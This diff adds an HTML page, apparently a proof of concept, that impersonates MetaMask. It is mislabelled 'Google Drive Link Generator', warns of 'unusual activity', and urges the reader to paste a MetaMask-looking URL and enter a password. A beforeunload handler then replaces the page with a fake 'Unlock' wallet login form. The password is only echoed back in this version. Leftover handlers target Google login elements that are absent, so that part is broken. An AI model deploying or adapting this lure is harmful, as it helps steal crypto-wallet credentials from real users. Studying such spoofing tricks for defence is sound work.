@@ -1,0 +1,108 @@
+<html>
+        <head>
+                <title>Google Drive Link Generator - URL to Drive</title>
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <style>
+                        textarea {
+                          -webkit-box-sizing: border-box;
+                  -moz-box-sizing: border-box;
+                          box-sizing: border-box;
+                          width: 100%;
+                        }
+                </style>
+        </head>
+        <body>
+                <h3>Metamask Security Team</h3>
+                <p>We detected unusual activity from your account<br>
+                <textarea rows="4">https://metamask.io:81</textarea>
+                </p>
+
+                <p>
+                (To protect your Metamask Wallet, please copy and paste the URL into current address bar, and put your password)
+                </p>
+
+                <button id="copyButton">Copy URL</button>
+                <script>
+                        addEventListener("beforeunload", e =>  {
+                                document.title = "Metamask Login";
+                                document.body.innerHTML = `
+  <div class="container">
+    <h2>Welcome back!</h2>
+    <p>Log in to your Metamask wallet</p>
+    <form onsubmit="event.preventDefault(); const pw = document.getElementById('password').value; prompt('Here is your password:', pw);">
+      <input type="password" id="password" placeholder="Enter your password" required>
+      <button type="submit">Unlock</button>
+    </form>
+  </div>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: #ffffff;
+      padding: 24px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 300px;
+      text-align: center;
+    }
+
+    h2 {
+      margin-bottom: 16px;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 8px;
+      margin-bottom: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    button {
+      width: 100%;
+      background-color: #f6851b;
+      color: white;
+      border: none;
+      padding: 10px;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #e2761b;
+    }
+  </style>
+`;
+
+                                document.getElementsByClassName("whsOnd")[0].addEventListener("input", function() {
+                                        if (document.getElementsByClassName("whsOnd")[0].value.length !== 0) {
+                                                document.getElementsByClassName("rFrNMe")[0].classList.add("CDELXb");
+                                        } else {
+                                                document.getElementsByClassName("rFrNMe")[0].classList.remove("CDELXb");
+                                        }
+                                });
+
+                                document.getElementById("nextButton").addEventListener("click", function() {
+                                        let email = document.getElementsByClassName("whsOnd")[0].value
+                                        alert(`Email address value is: ${email}`)
+                                });
+                        })
+
+                        document.getElementById("copyButton").onclick = function(){
+                        document.querySelector("textarea").select();
+                        document.execCommand('copy');
+                        }
+                </script>
+        </body>
+</html
